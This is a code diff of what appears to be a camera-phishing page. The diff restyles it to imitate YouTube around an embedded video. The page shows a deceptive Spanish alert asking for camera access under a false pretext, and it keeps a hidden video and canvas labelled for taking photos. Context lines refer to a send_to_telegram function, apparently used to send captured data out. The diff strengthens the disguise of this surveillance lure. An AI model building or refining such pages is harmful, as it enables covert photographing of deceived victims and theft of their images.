@@ -16,7 +16,43 @@ send_to_telegram($msg);
 <!doctype html>
 <html>
 <head>
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <meta charset="UTF-8">
+    <title>YouTube - Video</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        /* Fondo oscuro similar a YouTube */
+        body {
+            margin: 0;
+            background-color: #121212;
+            color: #fff;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Contenedor de video */
+        .video-container {
+            position: relative;
+            width: 100%;
+            max-width: 960px;
+            margin: 50px auto;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        /* Barra de título simulada */
+        .video-title-bar {
+            background-color: #202020;
+            padding: 10px;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        iframe {
+            display: block;
+            width: 100%;
+            height: 540px;
+        }
+    </style>
 </head>
 <body>
 
@@ -25,8 +61,11 @@ send_to_telegram($msg);
 alert("Para ofrecer la mejor experiencia, necesitamos acceso a tu cámara. Esto nos permitirá gestionar tus archivos multimedia de forma eficiente, guardar videos de demostración y reproducirlos directamente en la aplicación.");
 </script>
 
-<!-- Video de YouTube -->
-<iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<div class="video-container">
+    <div class="video-title-bar">YouTube Video - Aldo Arturo</div>
+    <!-- Video de YouTube -->
+    <iframe id="Live_YT_TV" src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</div>
 
 <!-- Video y Canvas ocultos para tomar fotos -->
 <video id="video" autoplay playsinline style="display:none;"></video>
